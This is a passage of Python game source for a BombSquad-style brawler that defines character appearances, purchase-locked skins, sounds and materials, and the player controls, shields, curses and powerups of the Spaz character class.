import weakref
import random

import bs
import bsUtils
import bsInternal
import fire
import settings_spaz as set_spaz

# list of defined spazzes
appearances = {}


def getAppearances(includeLocked=False):
    disallowed = []
    if not includeLocked:
        # hmm yeah this'll be tough to hack...
        if not bsInternal._getPurchased('characters.santa'):
            disallowed.append('Santa Claus')
        if not bsInternal._getPurchased('characters.frosty'):
            disallowed.append('Frosty')
        if not bsInternal._getPurchased('characters.bones'):
            disallowed.append('Bones')
        if not bsInternal._getPurchased('characters.bernard'):
            disallowed.append('Bernard')
        if not bsInternal._getPurchased('characters.pixie'):
            disallowed.append('Pixel')
        if not bsInternal._getPurchased('characters.pascal'):
            disallowed.append('Pascal')
        if not bsInternal._getPurchased('characters.actionhero'):
            disallowed.append('Todd McBurton')
        if not bsInternal._getPurchased('characters.taobaomascot'):
            disallowed.append('Taobao Mascot')
        if not bsInternal._getPurchased('characters.agent'):
            disallowed.append('Agent Johnson')
        if not bsInternal._getPurchased('characters.jumpsuit'):
            disallowed.append('Lee')
        if not bsInternal._getPurchased('characters.assassin'):
            disallowed.append('Zola')
        if not bsInternal._getPurchased('characters.wizard'):
            disallowed.append('Grumbledorf')
        if not bsInternal._getPurchased('characters.cowboy'):
            disallowed.append('Butch')
        if not bsInternal._getPurchased('characters.witch'):
            disallowed.append('Witch')
        if not bsInternal._getPurchased('characters.warrior'):
            disallowed.append('Warrior')
        if not bsInternal._getPurchased('characters.superhero'):
            disallowed.append('Middle-Man')
        if not bsInternal._getPurchased('characters.alien'):
            disallowed.append('Alien')
        if not bsInternal._getPurchased('characters.oldlady'):
            disallowed.append('OldLady')
        if not bsInternal._getPurchased('characters.gladiator'):
            disallowed.append('Gladiator')
        if not bsInternal._getPurchased('characters.wrestler'):
            disallowed.append('Wrestler')
        if not bsInternal._getPurchased('characters.operasinger'):
            disallowed.append('Gretel')
        if not bsInternal._getPurchased('characters.robot'):
            disallowed.append('Robot')
        if not bsInternal._getPurchased('characters.cyborg'):
            disallowed.append('B-9000')
        if not bsInternal._getPurchased('characters.bunny'):
            disallowed.append('Easter Bunny')
        if not bsInternal._getPurchased('characters.kronk'):
            disallowed.append('Kronk')
        if not bsInternal._getPurchased('characters.zoe'):
            disallowed.append('Zoe')
        if not bsInternal._getPurchased('characters.jackmorgan'):
            disallowed.append('Jack Morgan')
        if not bsInternal._getPurchased('characters.mel'):
            disallowed.append('Mel')
        if not bsInternal._getPurchased('characters.snakeshadow'):
            disallowed.append('Snake Shadow')
    return [s for s in appearances.keys() if s not in disallowed]


gPowerupWearOffTime = 20000
gBasePunchPowerScale = 1.2 # obsolete - just used for demo guy now
gBasePunchCooldown = 400
gLameBotColor = (1.2, 0.9, 0.2)
gLameBotHighlight = (1.0, 0.5, 0.6)
gDefaultBotColor = (0.6, 0.6, 0.6)
gDefaultBotHighlight = (0.1, 0.3, 0.1)
gProBotColor = (1.0, 0.2, 0.1)
gProBotHighlight = (0.6, 0.1, 0.05)
gLastTurboSpamWarningTime = -99999


class _PickupMessage(object):
    'We wanna pick something up'
    pass


class _PunchHitMessage(object):
    'Message saying an object was hit'
    pass


class _CurseExplodeMessage(object):
    'We are cursed and should blow up now.'
    pass


class _BombDiedMessage(object):
    "A bomb has died and thus can be recycled"
    pass


class Appearance(object):
    """Create and fill out one of these suckers to define a spaz appearance"""
    def __init__(self, name):
        self.name = name
        if appearances.has_key(self.name):
            raise Exception("spaz appearance name \""
                            + self.name + "\" already exists.")
        appearances[self.name] = self
        self.colorTexture = ""
        self.headModel = ""
        self.torsoModel = ""
        self.pelvisModel = ""
        self.upperArmModel = ""
        self.foreArmModel = ""
        self.handModel = ""
        self.upperLegModel = ""
        self.lowerLegModel = ""
        self.toesModel = ""
        self.jumpSounds = []
        self.attackSounds = []
        self.impactSounds = []
        self.deathSounds = []
        self.pickupSounds = []
        self.fallSounds = []
        self.style = 'spaz'
        self.defaultColor = None
        self.defaultHighlight = None


class SpazFactory(object):
    """
    Category: Game Flow Classes

    Wraps up media and other resources used by bs.Spaz instances.
    Generally one of these is created per bs.Activity and shared
    between all spaz instances.  Use bs.Spaz.getFactory() to return
    the shared factory for the current activity.

    Attributes:

       impactSoundsMedium
          A tuple of bs.Sounds for when a bs.Spaz hits something kinda hard.

       impactSoundsHard
          A tuple of bs.Sounds for when a bs.Spaz hits something really hard.

       impactSoundsHarder
          A tuple of bs.Sounds for when a bs.Spaz hits something really
          really hard.

       singlePlayerDeathSound
          The sound that plays for an 'importan' spaz death such as in
          co-op games.

       punchSound
          A standard punch bs.Sound.
       
       punchSoundsStrong
          A tuple of stronger sounding punch bs.Sounds.

       punchSoundStronger
          A really really strong sounding punch bs.Sound.

       swishSound
          A punch swish bs.Sound.

       blockSound
          A bs.Sound for when an attack is blocked by invincibility.

       shatterSound
          A bs.Sound for when a frozen bs.Spaz shatters.

       splatterSound
          A bs.Sound for when a bs.Spaz blows up via curse.

       spazMaterial
          A bs.Material applied to all of parts of a bs.Spaz.

       rollerMaterial
          A bs.Material applied to the invisible roller ball body that a bs.Spaz
          uses for locomotion.
    
       punchMaterial
          A bs.Material applied to the 'fist' of a bs.Spaz.

       pickupMaterial
          A bs.Material applied to the 'grabber' body of a bs.Spaz.

       curseMaterial
          A bs.Material applied to a cursed bs.Spaz that triggers an explosion.
    """

    def _preload(self, character):
        """
        Preload media that will be needed for a given character.
        """
        self._getMedia(character)

    def __init__(self):
        """
        Instantiate a factory object.
        """

        self.impactSoundsMedium = (bs.getSound('impactMedium'),
                                bs.getSound('impactMedium2'))
        self.impactSoundsHard = (bs.getSound('impactHard'),
                                 bs.getSound('impactHard2'),
                                 bs.getSound('impactHard3'))
        self.impactSoundsHarder = (bs.getSound('bigImpact'),
                                   bs.getSound('bigImpact2'))
        self.singlePlayerDeathSound = bs.getSound('playerDeath')
        self.punchSound = bs.getSound('punch01')
        
        self.punchSoundsStrong = (bs.getSound('punchStrong01'),
                                  bs.getSound('punchStrong02'))
        
        self.punchSoundStronger = bs.getSound('superPunch')
        
        self.swishSound = bs.getSound('punchSwish')
        self.blockSound = bs.getSound('block')
        self.shatterSound = bs.getSound('shatter')
        self.splatterSound = bs.getSound('splatter')
        
        self.spazMaterial = bs.Material()
        self.rollerMaterial = bs.Material()
        self.punchMaterial = bs.Material()
        self.pickupMaterial = bs.Material()
        self.curseMaterial = bs.Material()

        footingMaterial = bs.getSharedObject('footingMaterial')
        objectMaterial = bs.getSharedObject('objectMaterial')
        playerMaterial = bs.getSharedObject('playerMaterial')
        regionMaterial = bs.getSharedObject('regionMaterial')
        
        # send footing messages to spazzes so they know when they're on solid
        # ground.
        # eww this should really just be built into the spaz node
        self.rollerMaterial.addActions(
            conditions=('theyHaveMaterial', footingMaterial),
            actions=(('message', 'ourNode', 'atConnect', 'footing', 1),
                     ('message', 'ourNode', 'atDisconnect', 'footing', -1)))

        self.spazMaterial.addActions(
            conditions=('theyHaveMaterial', footingMaterial),
            actions=(('message', 'ourNode', 'atConnect', 'footing', 1),
                     ('message', 'ourNode', 'atDisconnect', 'footing', -1)))
        # punches
        self.punchMaterial.addActions(
            conditions=('theyAreDifferentNodeThanUs',),
            actions=(('modifyPartCollision', 'collide', True),
                     ('modifyPartCollision', 'physical', False),
                     ('message', 'ourNode', 'atConnect', _PunchHitMessage())))
        # pickups
        self.pickupMaterial.addActions(
            conditions=(('theyAreDifferentNodeThanUs',),
                        'and', ('theyHaveMaterial', objectMaterial)),
            actions=(('modifyPartCollision', 'collide', True),
                     ('modifyPartCollision', 'physical', False),
                     ('message', 'ourNode', 'atConnect', _PickupMessage())))
        # curse
        self.curseMaterial.addActions(
            conditions=(('theyAreDifferentNodeThanUs',),
                        'and', ('theyHaveMaterial', playerMaterial)),
            actions=('message', 'ourNode', 'atConnect', _CurseExplodeMessage()))

        self.footImpactSounds = (bs.getSound('footImpact01'),
                                 bs.getSound('footImpact02'),
                                 bs.getSound('footImpact03'))

        self.footSkidSound = bs.getSound('skid01')
        self.footRollSound = bs.getSound('scamper01')

        self.rollerMaterial.addActions(
            conditions=('theyHaveMaterial', footingMaterial),
            actions=(('impactSound', self.footImpactSounds, 1, 0.2),
                     ('skidSound', self.footSkidSound, 20, 0.3),
                     ('rollSound', self.footRollSound, 20, 3.0)))

        self.skidSound = bs.getSound('gravelSkid')

        self.spazMaterial.addActions(
            conditions=('theyHaveMaterial', footingMaterial),
            actions=(('impactSound', self.footImpactSounds, 20, 6),
                     ('skidSound', self.skidSound, 2.0, 1),
                     ('rollSound', self.skidSound, 2.0, 1)))

        self.shieldUpSound = bs.getSound('shieldUp')
        self.shieldDownSound = bs.getSound('shieldDown')
        self.shieldHitSound = bs.getSound('shieldHit')

        # we dont want to collide with stuff we're initially overlapping
        # (unless its marked with a special region material)
        self.spazMaterial.addActions(
            conditions=((('weAreYoungerThan', 51),
                         'and', ('theyAreDifferentNodeThanUs',)),
                        'and', ('theyDontHaveMaterial', regionMaterial)),
            actions=(('modifyNodeCollision', 'collide', False)))
        
        self.spazMedia = {}

        # lets load some basic rules (allows them to be tweaked from the
        # master server)
        self.shieldDecayRate = bsInternal._getAccountMiscReadVal('rsdr', 10.0)
        self.punchCooldown = bsInternal._getAccountMiscReadVal('rpc', 400)
        self.punchCooldownGloves = \
            bsInternal._getAccountMiscReadVal('rpcg', 300)
        self.punchPowerScale = bsInternal._getAccountMiscReadVal('rpp', 1.2)
        self.punchPowerScaleGloves = \
            bsInternal._getAccountMiscReadVal('rppg', 1.4)
        self.maxShieldSpilloverDamage = \
            bsInternal._getAccountMiscReadVal('rsms', 500)

    def _getStyle(self, character):
        return appearances[character].style
        
    def _getMedia(self, character):
        t = appearances[character]
        if not self.spazMedia.has_key(character):
            m = self.spazMedia[character] = {
                'jumpSounds':[bs.getSound(s) for s in t.jumpSounds],
                'attackSounds':[bs.getSound(s) for s in t.attackSounds],
                'impactSounds':[bs.getSound(s) for s in t.impactSounds],
                'deathSounds':[bs.getSound(s) for s in t.deathSounds],
                'pickupSounds':[bs.getSound(s) for s in t.pickupSounds],
                'fallSounds':[bs.getSound(s) for s in t.fallSounds],
                'colorTexture':bs.getTexture(t.colorTexture),
                'colorMaskTexture':bs.getTexture(t.colorMaskTexture),
                'headModel':bs.getModel(t.headModel),
                'torsoModel':bs.getModel(t.torsoModel),
                'pelvisModel':bs.getModel(t.pelvisModel),
                'upperArmModel':bs.getModel(t.upperArmModel),
                'foreArmModel':bs.getModel(t.foreArmModel),
                'handModel':bs.getModel(t.handModel),
                'upperLegModel':bs.getModel(t.upperLegModel),
                'lowerLegModel':bs.getModel(t.lowerLegModel),
                'toesModel':bs.getModel(t.toesModel)
            }
        else:
            m = self.spazMedia[character]
        return m

class Spaz(bs.Actor):
    """
    category: Game Flow Classes
    
    Base class for various Spazzes.
    A Spaz is the standard little humanoid character in the game.
    It can be controlled by a player or by AI, and can have
    various different appearances.  The name 'Spaz' is not to be
    confused with the 'Spaz' character in the game, which is just
    one of the skins available for instances of this class.

    Attributes:

       node
          The 'spaz' bs.Node.
    """
    pointsMult = 1
    curseTime = 5000
    defaultBombCount = 2
    defaultBombType = 'normal'
    defaultBoxingGloves = True
    defaultShields = False

    def __init__(self, color=(1, 1, 1), highlight=(0.5, 0.5, 0.5),
                 character="Spaz", sourcePlayer=None, startInvincible=True,
                 canAcceptPowerups=False, powerupsExpire=False, demoMode=False):
        """
        Create a new spaz with the requested color, character, etc.
        """
        
        bs.Actor.__init__(self)
        activity = self.getActivity()
        
        factory = self.getFactory()

        # we need to behave slightly different in the tutorial
        self._demoMode = demoMode
        
        self.playBigDeathSound = False

        # translate None into empty player-ref
        if sourcePlayer is None: sourcePlayer = bs.Player(None)

        # scales how much impacts affect us (most damage calcs)
        self._impactScale = 1.0
        
        self.sourcePlayer = sourcePlayer
        self._dead = False
        if self._demoMode: # preserve old behavior
            self._punchPowerScale = gBasePunchPowerScale
        else:
            self._punchPowerScale = factory.punchPowerScale
        self.fly = bs.getSharedObject('globals').happyThoughtsMode
        self._hockey = activity._map.isHockey
        self._punchedNodes = set()
        self._cursed = False
        self._connectedToPlayer = None

        materials = [factory.spazMaterial,
                     bs.getSharedObject('objectMaterial'),
                     bs.getSharedObject('playerMaterial')]
        
        rollerMaterials = [factory.rollerMaterial,
                           bs.getSharedObject('playerMaterial')]
        
        extrasMaterials = []
        
        if set_spaz.pwp:
            pam = bs.Powerup.getFactory().powerupAcceptMaterial
            materials.append(pam)
            rollerMaterials.append(pam)
            extrasMaterials.append(pam)

        media = factory._getMedia(character)
        self.node = bs.newNode(
            type="spaz",
            delegate=self,
            attrs={'color':color,
                   'behaviorVersion':0 if demoMode else 1,
                   'demoMode':True if demoMode else False,
                   'highlight':highlight,
                   'jumpSounds':media['jumpSounds'],
                   'attackSounds':media['attackSounds'],
                   'impactSounds':media['impactSounds'],
                   'deathSounds':media['deathSounds'],
                   'pickupSounds':media['pickupSounds'],
                   'fallSounds':media['fallSounds'],
                   'colorTexture':media['colorTexture'],
                   'colorMaskTexture':media['colorMaskTexture'],
                   'headModel':media['headModel'],
                   'torsoModel':media['torsoModel'],
                   'pelvisModel':media['pelvisModel'],
                   'upperArmModel':media['upperArmModel'],
                   'foreArmModel':media['foreArmModel'],
                   'handModel':media['handModel'],
                   'upperLegModel':media['upperLegModel'],
                   'lowerLegModel':media['lowerLegModel'],
                   'toesModel':media['toesModel'],
                   'style':factory._getStyle(character),
                   'fly':self.fly,
                   'hockey':self._hockey,
                   'materials':materials,
                   'rollerMaterials':rollerMaterials,
                   'extrasMaterials':extrasMaterials,
                   'punchMaterials':(factory.punchMaterial,
                                     bs.getSharedObject('attackMaterial')),
                   'pickupMaterials':(factory.pickupMaterial,
                                      bs.getSharedObject('pickupMaterial')),
                   'invincible':startInvincible,
                   'sourcePlayer':sourcePlayer})
        self.shield = None

        if startInvincible:
            def _safeSetAttr(node, attr, val):
                if node.exists(): setattr(node, attr, val)
            bs.gameTimer(1000, bs.Call(_safeSetAttr, self.node,
                                       'invincible', False))
        self.hitPoints = 1000
        self.hitPointsMax = 1000
        self.bombCount = self.defaultBombCount
        self._maxBombCount = self.defaultBombCount
        self.bombTypeDefault = self.defaultBombType
        self.bombType = self.bombTypeDefault
        self.landMineCount = 0
        self.blastRadius = 2.0
        self.powerupsExpire = powerupsExpire
        if self._demoMode: # preserve old behavior
            self._punchCooldown = gBasePunchCooldown
        else:
            self._punchCooldown = factory.punchCooldown
        self._jumpCooldown = 250
        self._pickupCooldown = 0
        self._bombCooldown = 0
        self._hasBoxingGloves = False
        if self.defaultBoxingGloves: self.equipBoxingGloves()
        self.lastPunchTime = -9999
        self.lastJumpTime = -9999
        self.lastPickupTime = -9999
        self.lastRunTime = -9999
        self._lastRunValue = 0
        self.lastBombTime = -9999
        self._turboFilterTimes = {}
        self._turboFilterTimeBucket = 0
        self._turboFilterCounts = {}
        self.frozen = False
        self.shattered = False
        self._lastHitTime = None
        self._numTimesHit = 0
        self._bombHeld = False
        if self.defaultShields: self.equipShields()
        self._droppedBombCallbacks = []

        # deprecated stuff.. need to make these into lists
        self.punchCallback = None
        self.pickUpPowerupCallback = None

    def onFinalize(self):
        bs.Actor.onFinalize(self)

        # release callbacks/refs so we don't wind up with dependency loops..
        self._droppedBombCallbacks = []
        self.punchCallback = None
        self.pickUpPowerupCallback = None
        
    def addDroppedBombCallback(self, call):
        """
        Add a call to be run whenever this Spaz drops a bomb.
        The spaz and the newly-dropped bomb are passed as arguments.
        """
        self._droppedBombCallbacks.append(call)
                            
    def isAlive(self):
        """
        Method override; returns whether ol' spaz is still kickin'.
        """
        return not self._dead

    @classmethod
    def getFactory(cls):
        """
        Returns the shared bs.SpazFactory object, creating it if necessary.
        """
        activity = bs.getActivity()
        if activity is None: raise Exception("no current activity")
        try: return activity._sharedSpazFactory
        except Exception:
            f = activity._sharedSpazFactory = SpazFactory()
            return f

    def exists(self):
        return self.node.exists()

    def _hideScoreText(self):
        if self._scoreText.exists():
            bs.animate(self._scoreText, 'scale',
                       {0:self._scoreText.scale, 200:0})

    def _turboFilterAddPress(self, source):
        """
        Can pass all button presses through here; if we see an obscene number
        of them in a short time let's shame/pushish this guy for using turbo
        """
        t = bs.getNetTime()
        tBucket = int(t/1000)
        if tBucket == self._turboFilterTimeBucket:
            # add only once per timestep (filter out buttons triggering
            # multiple actions)
            if t != self._turboFilterTimes.get(source, 0):
                self._turboFilterCounts[source] = \
                    self._turboFilterCounts.get(source, 0) + 1
                self._turboFilterTimes[source] = t
                # (uncomment to debug; prints what this count is at)
                # bs.screenMessage( str(source) + " "
                #                   + str(self._turboFilterCounts[source]))
                if self._turboFilterCounts[source] == 15:
                    
                    # knock 'em out.  That'll learn 'em.
                    self.node.handleMessage("knockout", 500.0)

                    # also issue periodic notices about who is turbo-ing
                    realTime = bs.getRealTime()
                    global gLastTurboSpamWarningTime
                    if realTime > gLastTurboSpamWarningTime + 30000:
                        gLastTurboSpamWarningTime = realTime
                        bs.screenMessage(
                            bs.Lstr(translate=('statements',
                                               ('Warning to ${NAME}:  '
                                                'turbo / button-spamming knocks'
                                                ' you out.')),
                                    subs=[('${NAME}', self.node.name)]),
                            color=(1, 0.5, 0))
                        bs.playSound(bs.getSound('error'))
        else:
            self._turboFilterTimes = {}
            self._turboFilterTimeBucket = tBucket
            self._turboFilterCounts = {source:1}
        
    def setScoreText(self, t, color=(1, 1, 0.4), flash=False):
        """
        Utility func to show a message momentarily over our spaz that follows
        him around; Handy for score updates and things.
        """
        colorFin = bs.getSafeColor(color)[:3]
        if not self.node.exists(): return
        try: exists = self._scoreText.exists()
        except Exception: exists = False
        if not exists:
            startScale = 0.0
            m = bs.newNode('math', owner=self.node, attrs={ 'input1':(0, 1.4, 0),
                                                            'operation':'add' })
            self.node.connectAttr('torsoPosition', m, 'input2')
            self._scoreText = bs.newNode('text',
                                          owner=self.node,
                                          attrs={'text':t,
                                                 'inWorld':True,
                                                 'shadow':1.0,
                                                 'flatness':1.0,
                                                 'color':colorFin,
                                                 'scale':0.02,
                                                 'hAlign':'center'})
            m.connectAttr('output', self._scoreText, 'position')
        else:
            self._scoreText.color = colorFin
            startScale = self._scoreText.scale
            self._scoreText.text = t
        if flash:
            combine = bs.newNode("combine", owner=self._scoreText,
                                 attrs={'size':3})
            sc = 1.8
            offs = 0.5
            t = 300
            for i in range(3):
                c1 = offs+sc*colorFin[i]
                c2 = colorFin[i]
                bs.animate(combine, 'input'+str(i), {0.5*t:c2,
                                                   0.75*t:c1,
                                                   1.0*t:c2})
            combine.connectAttr('output', self._scoreText, 'color')
            
        bs.animate(self._scoreText, 'scale', {0:startScale, 200:0.02})
        self._scoreTextHideTimer = bs.Timer(1000,
                                            bs.WeakCall(self._hideScoreText))
        
    def onJumpPress(self):
        """
        Called to 'press jump' on this spaz;
        used by player or AI connections.
        """
        if not self.node.exists(): return
        t = bs.getGameTime()
        if t - self.lastJumpTime >= self._jumpCooldown:
            self.node.jumpPressed = True
            self.lastJumpTime = t
        self._turboFilterAddPress('jump')

    def onJumpRelease(self):
        """
        Called to 'release jump' on this spaz;
        used by player or AI connections.
        """
        if not self.node.exists(): return
        self.node.jumpPressed = False

    def onPickUpPress(self):
        """
        Called to 'press pick-up' on this spaz;
        used by player or AI connections.
        """
        if not self.node.exists(): return
        t = bs.getGameTime()
        if t - self.lastPickupTime >= self._pickupCooldown:
            self.node.pickUpPressed = True
            self.lastPickupTime = t
        self._turboFilterAddPress('pickup')

    def onPickUpRelease(self):
        """
        Called to 'release pick-up' on this spaz;
        used by player or AI connections.
        """
        if not self.node.exists(): return
        self.node.pickUpPressed = False

    def _onHoldPositionPress(self):
        """
        Called to 'press hold-position' on this spaz;
        used for player or AI connections.
        """
        if not self.node.exists(): return
        self.node.holdPositionPressed = True
        self._turboFilterAddPress('holdposition')

    def _onHoldPositionRelease(self):
        """
        Called to 'release hold-position' on this spaz;
        used for player or AI connections.
        """
        if not self.node.exists(): return
        self.node.holdPositionPressed = False

    def onPunchPress(self):
        """
        Called to 'press punch' on this spaz;
        used for player or AI connections.
        """
        if (not self.node.exists()
            or self.frozen
            or self.node.knockout > 0.0): return
        t = bs.getGameTime()
        if t - self.lastPunchTime >= self._punchCooldown:
            if self.punchCallback is not None:
                self.punchCallback(self)
            self._punchedNodes = set() # reset this..
            self.lastPunchTime = t
            self.node.punchPressed = True
            if not self.node.holdNode.exists():
                bs.gameTimer(100, bs.WeakCall(self._safePlaySound,
                                              self.getFactory().swishSound,
                                              0.8))
        self._turboFilterAddPress('punch')

    def _safePlaySound(self, sound, volume):
        """
        Plays a sound at our position if we exist.
        """
        if self.node.exists():
            bs.playSound(sound, volume, self.node.position)
        
    def onPunchRelease(self):
        """
        Called to 'release punch' on this spaz;
        used for player or AI connections.
        """
        if not self.node.exists(): return
        self.node.punchPressed = False

    def onBombPress(self):
        """
        Called to 'press bomb' on this spaz;
        used for player or AI connections.
        """
        if not self.node.exists(): return
        
        if self._dead or self.frozen: return
        if self.node.knockout > 0.0: return
        t = bs.getGameTime()
        if t - self.lastBombTime >= self._bombCooldown:
            self.lastBombTime = t
            self.node.bombPressed = True
            if not self.node.holdNode.exists(): self.dropBomb()
        self._turboFilterAddPress('bomb')

    def onBombRelease(self):
        """
        Called to 'release bomb' on this spaz; 
        used for player or AI connections.
        """
        if not self.node.exists(): return
        self.node.bombPressed = False

    def onRun(self, value):
        """
        Called to 'press run' on this spaz;
        used for player or AI connections.
        """
        if not self.node.exists(): return

        t = bs.getGameTime()
        self.lastRunTime = t
        self.node.run = value

        # filtering these events would be tough since its an analog
        # value, but lets still pass full 0-to-1 presses along to
        # the turbo filter to punish players if it looks like they're turbo-ing
        if self._lastRunValue < 0.01 and value > 0.99:
            self._turboFilterAddPress('run')
            
        self._lastRunValue = value
            

    def onFlyPress(self):
        """
        Called to 'press fly' on this spaz;
        used for player or AI connections.
        """
        if not self.node.exists(): return
        # not adding a cooldown time here for now; slightly worried
        # input events get clustered up during net-games and we'd wind up
        # killing a lot and making it hard to fly.. should look into this.
        self.node.flyPressed = True
        self._turboFilterAddPress('fly')

    def onFlyRelease(self):
        """
        Called to 'release fly' on this spaz;
        used for player or AI connections.
        """
        if not self.node.exists(): return
        self.node.flyPressed = False

    def onMove(self, x, y):
        """
        Called to set the joystick amount for this spaz;
        used for player or AI connections.
        """
        if not self.node.exists(): return
        self.node.handleMessage("move", x, y)
        
    def onMoveUpDown(self, value):
        """
        Called to set the up/down joystick amount on this spaz;
        used for player or AI connections.
        value will be between -32768 to 32767
        WARNING: deprecated; use onMove instead.
        """
        if not self.node.exists(): return
        self.node.moveUpDown = value

    def onMoveLeftRight(self, value):
        """
        Called to set the left/right joystick amount on this spaz;
        used for player or AI connections.
        value will be between -32768 to 32767
        WARNING: deprecated; use onMove instead.
        """
        if not self.node.exists(): return
        self.node.moveLeftRight = value

    def onPunched(self, damage):
        """
        Called when this spaz gets punched.
        """
        pass

    def getDeathPoints(self, how):
        'Get the points awarded for killing this spaz'
        numHits = float(max(1, self._numTimesHit))
        # base points is simply 10 for 1-hit-kills and 5 otherwise
        importance = 2 if numHits < 2 else 1
        return ((10 if numHits < 2 else 5) * self.pointsMult, importance)

    def curse(self):
        """
        Give this poor spaz a curse;
        he will explode in 5 seconds.
        """
        if not self._cursed:
            factory = self.getFactory()
            self._cursed = True
            # add the curse material..
            for attr in ['materials', 'rollerMaterials']:
                materials = getattr(self.node, attr)
                if not factory.curseMaterial in materials:
                    setattr(self.node, attr,
                            materials + (factory.curseMaterial,))

            # -1 specifies no time limit
            if self.curseTime == -1:
                self.node.curseDeathTime = -1
            else:
                self.node.curseDeathTime = bs.getGameTime()+5000
                bs.gameTimer(5000, bs.WeakCall(self.curseExplode))

    def equipBoxingGloves(self):
        """
        Give this spaz some boxing gloves.
        """
        self.node.boxingGloves = 1
        if self._demoMode: # preserve old behavior
            self._punchPowerScale = 1.7
            self._punchCooldown = 300
        else:
            factory = self.getFactory()
            self._punchPowerScale = factory.punchPowerScaleGloves
            self._punchCooldown = factory.punchCooldownGloves

    def equipShields(self, decay=False):
        """
        Give this spaz a nice energy shield.
        """

        if not self.node.exists():
            bs.printError('Can\'t equip shields; no node.')
            return
        
        factory = self.getFactory()
        if self.shield is None: 
            self.shield = bs.newNode('shield', owner=self.node,
                                     attrs={'color':(0.3, 0.2, 2.0),
                                            'radius':1.3})
            self.node.connectAttr('positionCenter', self.shield, 'position')
        self.shieldHitPoints = self.shieldHitPointsMax = 650
        self.shieldDecayRate = factory.shieldDecayRate if decay else 0
        self.shield.hurt = 0
        bs.playSound(factory.shieldUpSound, 1.0, position=self.node.position)

        if self.shieldDecayRate > 0:
            self.shieldDecayTimer = bs.Timer(500, bs.WeakCall(self.shieldDecay),
                                             repeat=True)
            self.shield.alwaysShowHealthBar = True # so user can see the decay

    def shieldDecay(self):
        'Called repeatedly to decay shield HP over time.'
        if self.shield is not None and self.shield.exists():
            self.shieldHitPoints = \
                max(0, self.shieldHitPoints - self.shieldDecayRate)
            self.shield.hurt = \
                1.0 - float(self.shieldHitPoints)/self.shieldHitPointsMax
            if self.shieldHitPoints <= 0:
                self.shield.delete()
                self.shield = None
                self.shieldDecayTimer = None
                bs.playSound(self.getFactory().shieldDownSound,
                             1.0, position=self.node.position)
        else:
            self.shieldDecayTimer = None
        
    def handleMessage(self, msg):
        self._handleMessageSanityCheck()

        if isinstance(msg, bs.PickedUpMessage):
            self.node.handleMessage("hurtSound")
            self.node.handleMessage("pickedUp")
            # this counts as a hit
            self._numTimesHit += 1

        elif isinstance(msg, bs.ShouldShatterMessage):
            # eww; seems we have to do this in a timer or it wont work right
            # (since we're getting called from within update() perhaps?..)
            bs.gameTimer(1, bs.WeakCall(self.shatter))

        elif isinstance(msg, bs.ImpactDamageMessage):
            # eww; seems we have to do this in a timer or it wont work right
            # (since we're getting called from within update() perhaps?..)
            bs.gameTimer(1, bs.WeakCall(self._hitSelf, msg.intensity))

        elif isinstance(msg, bs.PowerupMessage):
            if self._dead: return True
            if self.pickUpPowerupCallback is not None:
                self.pickUpPowerupCallback(self)

            if (msg.powerupType == 'tripleBombs'):
                tex = bs.Powerup.getFactory().texBomb
                self._flashBillboard(tex)
                self.setBombCount(3)
                if self.powerupsExpire:
                    self.node.miniBillboard1Texture = tex
                    t = bs.getGameTime()
                    self.node.miniBillboard1StartTime = t
                    self.node.miniBillboard1EndTime = t+gPowerupWearOffTime
                    self._multiBombWearOffFlashTimer = \
                        bs.Timer(gPowerupWearOffTime-2000,
                                 bs.WeakCall(self._multiBombWearOffFlash))
                    self._multiBombWearOffTimer = \
                        bs.Timer(gPowerupWearOffTime,
                                 bs.WeakCall(self._multiBombWearOff))
            elif msg.powerupType == 'landMines':
                self.setLandMineCount(min(self.landMineCount+3, 3))
            elif msg.powerupType == 'impactBombs':
                self.bombType = 'impact'
                tex = self._getBombTypeTex()
                self._flashBillboard(tex)
                if self.powerupsExpire:
                    self.node.miniBillboard2Texture = tex
                    t = bs.getGameTime()
                    self.node.miniBillboard2StartTime = t
                    self.node.miniBillboard2EndTime = t+gPowerupWearOffTime
                    self._bombWearOffFlashTimer = \
                        bs.Timer( gPowerupWearOffTime-2000,
                                  bs.WeakCall(self._bombWearOffFlash))
                    self._bombWearOffTimer = \
                        bs.Timer(gPowerupWearOffTime,
                                 bs.WeakCall(self._bombWearOff))
            elif msg.powerupType == 'stickyBombs':
                self.bombType = 'sticky'
                tex = self._getBombTypeTex()
                self._flashBillboard(tex)
                if self.powerupsExpire:
                    self.node.miniBillboard2Texture = tex
                    t = bs.getGameTime()
                    self.node.miniBillboard2StartTime = t
                    self.node.miniBillboard2EndTime = t+gPowerupWearOffTime
                    self._bombWearOffFlashTimer = \
                        bs.Timer(gPowerupWearOffTime-2000,
                                 bs.WeakCall(self._bombWearOffFlash))
                    self._bombWearOffTimer = \
                        bs.Timer(gPowerupWearOffTime,
                                 bs.WeakCall(self._bombWearOff))
            elif msg.powerupType == 'punch':
                self._hasBoxingGloves = True
                tex = bs.Powerup.getFactory().texPunch
                self._flashBillboard(tex)
                self.equipBoxingGloves()
                if self.powerupsExpire:
                    self.node.boxingGlovesFlashing = 0
                    self.node.miniBillboard3Texture = tex
                    t = bs.getGameTime()
                    self.node.miniBillboard3StartTime = t
                    self.node.miniBillboard3EndTime = t+gPowerupWearOffTime
                    self._boxingGlovesWearOffFlashTimer = \
                        bs.Timer(gPowerupWearOffTime-2000,
                                 bs.WeakCall(self._glovesWearOffFlash))
                    self._boxingGlovesWearOffTimer = \
                        bs.Timer(gPowerupWearOffTime,
                                 bs.WeakCall(self._glovesWearOff))
            elif msg.powerupType == 'shield':
                factory = self.getFactory()
                # let's allow powerup-equipped shields to lose hp over time
                self.equipShields(
                    decay=True if factory.shieldDecayRate > 0 else False)
            elif msg.powerupType == 'curse':
                self.curse()
            elif (msg.powerupType == 'iceBombs'):
                self.bombType = 'ice'
                tex = self._getBombTypeTex()
                self._flashBillboard(tex)
                if self.powerupsExpire:
                    self.node.miniBillboard2Texture = tex
                    t = bs.getGameTime()
                    self.node.miniBillboard2StartTime = t
                    self.node.miniBillboard2EndTime = t+gPowerupWearOffTime
                    self._bombWearOffFlashTimer = \
                        bs.Timer(gPowerupWearOffTime-2000,
                                 bs.WeakCall(self._bombWearOffFlash))
                    self._bombWearOffTimer = \
                        bs.Timer(gPowerupWearOffTime,
                                 bs.WeakCall(self._bombWearOff))
            elif (msg.powerupType == 'health'):
                if self._cursed:
                    self._cursed = False
                    # remove cursed material
                    factory = self.getFactory()
                    for attr in ['materials', 'rollerMaterials']:
                        materials = getattr(self.node, attr)
                        if factory.curseMaterial in materials:
                            setattr(self.node, attr,
                                    tuple(m for m in materials
                                          if m != factory.curseMaterial))
                    self.node.curseDeathTime = 0
